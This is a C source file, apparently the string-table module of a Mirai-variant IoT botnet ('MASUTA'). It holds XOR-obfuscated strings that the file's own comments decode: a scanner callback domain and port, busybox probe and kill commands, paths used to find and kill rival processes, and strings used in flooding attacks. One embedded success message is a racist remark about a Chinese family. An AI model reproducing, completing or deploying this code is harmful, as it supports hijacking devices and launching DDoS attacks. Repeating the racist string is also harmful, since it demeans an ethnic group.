#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdedeffba;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    // 127
    add_entry(TABLE_CNC_PORT, "\x45\x3A", 2);
    // nexusiotsolutions.net
    add_entry(TABLE_SCAN_CB_DOMAIN, "\x2B\x20\x3D\x30\x36\x2C\x2A\x31\x36\x2A\x29\x30\x31\x2C\x2A\x2B\x36\x6B\x2B\x20\x31\x45", 22);
    // 48101
    add_entry(TABLE_SCAN_CB_PORT, "\xFE\xA0", 2);
    // gosh that chinese family at the other table sure ate alot
    add_entry(TABLE_EXEC_SUCCESS, "\x22\x2A\x36\x2D\x65\x31\x2D\x24\x31\x65\x26\x2D\x2C\x2B\x20\x36\x20\x65\x23\x24\x28\x2C\x29\x3C\x65\x24\x31\x65\x31\x2D\x20\x65\x2A\x31\x2D\x20\x37\x65\x31\x24\x27\x29\x20\x65\x36\x30\x37\x20\x65\x24\x31\x20\x65\x24\x29\x2A\x31\x45", 58);
    // shell
    add_entry(TABLE_SCAN_SHELL, "\x36\x2D\x20\x29\x29\x45", 6);
    // enable
    add_entry(TABLE_SCAN_ENABLE, "\x20\x2B\x24\x27\x29\x20\x45", 7);
    // system
    add_entry(TABLE_SCAN_SYSTEM, "\x36\x3C\x36\x31\x20\x28\x45", 7);
    // sh
    add_entry(TABLE_SCAN_SH, "\x36\x2D\x45", 3);
    // /bin/busybox MASUTA
    add_entry(TABLE_SCAN_QUERY, "\x6A\x27\x2C\x2B\x6A\x27\x30\x36\x3C\x27\x2A\x3D\x65\x08\x04\x16\x10\x11\x04\x45", 20);
    // MASUTA: applet not found
    add_entry(TABLE_SCAN_RESP, "\x08\x04\x16\x10\x11\x04\x7F\x65\x24\x35\x35\x29\x20\x31\x65\x2B\x2A\x31\x65\x23\x2A\x30\x2B\x21\x45", 25);
    
    add_entry(TABLE_SCAN_NCORRECT, "\x2B\x26\x2A\x37\x37\x20\x26\x31\x45", 9);
    
    add_entry(TABLE_SCAN_PS, "\x6A\x27\x2C\x2B\x6A\x27\x30\x36\x3C\x27\x2A\x3D\x65\x35\x36\x45", 16);
    
    add_entry(TABLE_SCAN_KILL_9, "\x6A\x27\x2C\x2B\x6A\x27\x30\x36\x3C\x27\x2A\x3D\x65\x2E\x2C\x29\x29\x65\x68\x7C\x6A\x45", 22);
    // /proc/
    add_entry(TABLE_KILLER_PROC, "\x6A\x35\x37\x2A\x26\x6A\x45", 7);
    // /exe
    add_entry(TABLE_KILLER_EXE, "\x6A\x20\x3D\x20\x45", 5);
    // /fd
    add_entry(TABLE_KILLER_FD, "\x6A\x23\x21\x45", 4);
    // /maps
    add_entry(TABLE_KILLER_MAPS, "\x6A\x28\x24\x35\x36\x45", 6);
    // /proc/net/tcp
    add_entry(TABLE_KILLER_TCP, "\x6A\x35\x37\x2A\x26\x6A\x2B\x20\x31\x6A\x31\x26\x35\x45", 14);

    // dvrHelper
    add_entry(TABLE_MAPS_MIRAI, "\x21\x33\x37\x0D\x20\x29\x35\x20\x37\x45", 10);

    // TSource Engine Query
    add_entry(TABLE_ATK_VSE, "\x11\x16\x2A\x30\x37\x26\x20\x65\x00\x2B\x22\x2C\x2B\x20\x65\x14\x30\x20\x37\x3C\x45", 21);
    // /etc/resolv.conf
    add_entry(TABLE_ATK_RESOLVER, "\x6A\x20\x31\x26\x6A\x37\x20\x36\x2A\x29\x33\x6B\x26\x2A\x2B\x23\x45", 17);
    // nameserver
    add_entry(TABLE_ATK_NSERV, "\x2B\x24\x28\x20\x36\x20\x37\x33\x20\x37\x65\x45", 12);

    // /dev/watchdog
    add_entry(TABLE_MISC_WATCHDOG, "\x6A\x21\x20\x33\x6A\x32\x24\x31\x26\x2D\x21\x2A\x22\x45", 14);
    // /dev/misc/watchdog
    add_entry(TABLE_MISC_WATCHDOG2, "\x6A\x21\x20\x33\x6A\x28\x2C\x36\x26\x6A\x32\x24\x31\x26\x2D\x21\x2A\x22\x45", 19);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(!val->locked)
        {
            printf("[table] Tried to double-unlock value %d\n", id);
            return;
        }
    #endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to double-lock value\n");
            return;
        }
    #endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to access table.%d but it is locked\n", id);
            return NULL;
        }
    #endif

    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;

    #ifdef DEBUG
        table[id].locked = TRUE;
    #endif
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

    #ifdef DEBUG
        val->locked = !val->locked;
    #endif
}

